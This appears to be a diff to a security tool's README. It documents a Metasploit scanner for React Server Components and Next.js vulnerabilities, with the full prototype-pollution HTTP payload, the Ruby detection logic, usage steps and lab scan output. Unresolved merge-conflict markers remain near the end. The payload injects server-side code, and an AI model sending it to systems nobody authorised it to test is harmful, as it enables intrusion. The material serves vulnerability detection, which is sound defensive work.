@@ -102,7 +102,188 @@ nmap --script=nmap-nse/nextjs-rsc-cve-2025-66478-detect.nse -p 3001 TARGET_IP
 # Detect both vulnerabilities simultaneously
 nmap --script=nmap-nse/*.nse -p 3000,3001 TARGET_IP
 ```
+### Detection Mechanism of the Metasploit Module
 
+#### Detection Payload Construction
+
+The module sends a detection payload structured as follows:
+
+```http
+POST / HTTP/1.1
+Next-Action: x
+Content-Type: multipart/form-data; boundary=----hxorzboundary
+
+------hxorzboundary
+Content-Disposition: form-data; name="0"
+
+{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B0\"}","_response":{"_prefix":"throw Object.assign(new Error('NEXT_REDIRECT'), {digest:'msf-test-digest'})"}}
+------hxorzboundary--
+```
+
+**Key Field Analysis:**
+
+1. **`Next-Action: x`**: Triggers Next.js/React Server Actions processing flow
+2. **`Content-Type: multipart/form-data`**: Required format for RSC payloads
+3. **`__proto__`**: Prototype pollution keyword
+4. **`_prefix` Injection**:
+   ```javascript
+   throw Object.assign(new Error('NEXT_REDIRECT'), {digest:'msf-test-digest'})
+   ```
+   This code forces the server to throw an error containing a custom digest value
+
+#### Vulnerability Detection Logic
+
+The module uses a four-tier determination logic to confirm vulnerability status:
+
+##### Tier 1: **Confirmed Vulnerable** 
+```ruby
+if res.body =~ /^1:E\{.*"digest":.*\}/m
+  print_good("VULNERABLE: RSC digest exposure detected")
+end
+```
+
+**Detection Criteria:**
+- Response body matches regex `/^1:E\{.*"digest":.*\}/m`
+- Example response format:
+  ```
+  1:E{"digest":"msf-test-digest","message":"NEXT_REDIRECT"}
+  ```
+- **Content-Type**: `text/x-component`
+- **HTTP Status Code**: 500
+
+**Determination Basis:** Server fully reflected our injected digest value, confirming RSC processing flaw.
+
+##### Tier 2: **Potentially Vulnerable** 
+```ruby
+elsif res.code == 500 && res.headers['Content-Type']&.include?('text/x-component')
+  if res.body.include?('digest')
+    print_good("POTENTIALLY VULNERABLE: Unstable digest behavior")
+  end
+end
+```
+
+**Detection Criteria:**
+- HTTP 500 error
+- Content-Type contains `text/x-component`
+- Response body contains "digest" keyword but not in standard format
+
+**Determination Basis:** Server exhibits RSC-related behavior, but digest reflection is unstable, requiring manual verification.
+
+##### Tier 3: **RSC Channel Detected but No Digest Reflection** 
+```ruby
+else
+  print_status("RSC channel detected but no digest reflection")
+end
+```
+
+**Possible Reasons:**
+- Patched version
+- Custom RSC implementation
+- Different error handling configuration
+
+##### Tier 4: **No Vulnerability Indicators** 
+```ruby
+else
+  print_status("No RSC digest behavior detected")
+end
+```
+
+####  Detection Flowchart
+
+```
+┌─────────────────────────┐
+│  Send RSC Test Payload  │
+└───────────┬─────────────┘
+            │
+            ▼
+┌─────────────────────────┐
+│  Receive HTTP Response  │
+└───────────┬─────────────┘
+            │
+            ▼
+    ┌───────────────┐
+    │ Response Body │
+    │ Matches Pattern?│
+    │ 1:E{.*digest.*} │
+    └───┬───────┬───┘
+        │       │
+      YES│      │NO
+        │       │
+        ▼       ▼
+    ┌─────┐  ┌──────────────┐
+    │Confirmed│ │ HTTP 500 &  │
+    │Vulnerable││ text/x-component?│
+    └─────┘  └───┬──────┬───┘
+                 │      │
+               YES│     │NO
+                 │      │
+                 ▼      ▼
+         ┌───────────┐ ┌────────┐
+         │Contains   │ │Not     │
+         │"digest"?  │ │Vulnerable│
+         └─┬─────┬───┘ └────────┘
+           │     │
+         YES│    │NO
+           │     │
+           ▼     ▼
+       ┌─────────┐ ┌──────────┐
+       │Potentially││RSC Channel│
+       │Vulnerable │ │No Reflect│
+       └─────────┘ └──────────┘
+```
+
+### Usage Guide
+
+#### Basic Usage
+
+```bash
+# Start Metasploit
+msfconsole
+
+# Search for module
+msf > search rsc_digest
+
+# Load module
+msf > use auxiliary/scanner/http/rsc_digest_cve_2025_dual
+
+# Set target IP
+msf auxiliary(...) > set RHOSTS 10.211.55.65
+
+# Set port (3000 for React2Shell, 3001 for Next.js)
+msf auxiliary(...) > set RPORT 3000
+
+# Execute scan
+msf auxiliary(...) > run
+```
+
+#### Parameter Description
+
+| Parameter | Type | Default | Required | Description |
+|-----------|------|---------|----------|-------------|
+| `RHOSTS` | String | - | Yes | Target host(s) (single IP/range/file) |
+| `RPORT` | Integer | 3000 | Yes | Target port (common: 3000, 3001) |
+| `TARGETURI` | String | `/` | Yes | Test path (e.g., `/`, `/api/action`) |
+| `TIMEOUT` | Integer | 10 | Yes | HTTP request timeout (seconds) |
+
+#### Real Test Results Example
+
+```
+msf auxiliary(scanner/http/rsc_digest_cve_2025_dual) > set rport 3000
+rport => 3000
+msf auxiliary(scanner/http/rsc_digest_cve_2025_dual) > run
+[*] Scanning 10.211.55.65:3000
+[+] VULNERABLE: RSC digest exposure detected on 10.211.55.65:3000
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+msf auxiliary(scanner/http/rsc_digest_cve_2025_dual) > set rport 3001
+rport => 3001
+msf auxiliary(scanner/http/rsc_digest_cve_2025_dual) > run
+[*] Scanning 10.211.55.65:3001
+[+] VULNERABLE: RSC digest exposure detected on 10.211.55.65:3001
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
 ### Go Scanner Usage
 
 If the Go scanner is already built, run it directly:
@@ -282,6 +463,11 @@ This NSE script is specifically written for React2Shell scenarios, following the
 
 ![](https://files.mdnice.com/user/108782/f09bdc4e-085a-41ff-97b6-5a997d6155f6.png)
 
+<<<<<<< HEAD
+=======
+# Screenshots of Metasploit Module Development and Detection
+![](https://files.mdnice.com/user/108782/68541f20-281d-4fef-acdd-a98715771ea3.jpg)
+>>>>>>> 95d965e (Add Metasploit RSC digest scanner for CVE-2025-55182 and CVE-2025-66478)
 # Environment Description
 
 Currently, the repository only publicly releases detection scripts, one-click lab setup scripts, and Nuclei installation scripts. All content can be directly pulled down for your own reproduction and verification. If you find this project useful, feel free to give it a Star.
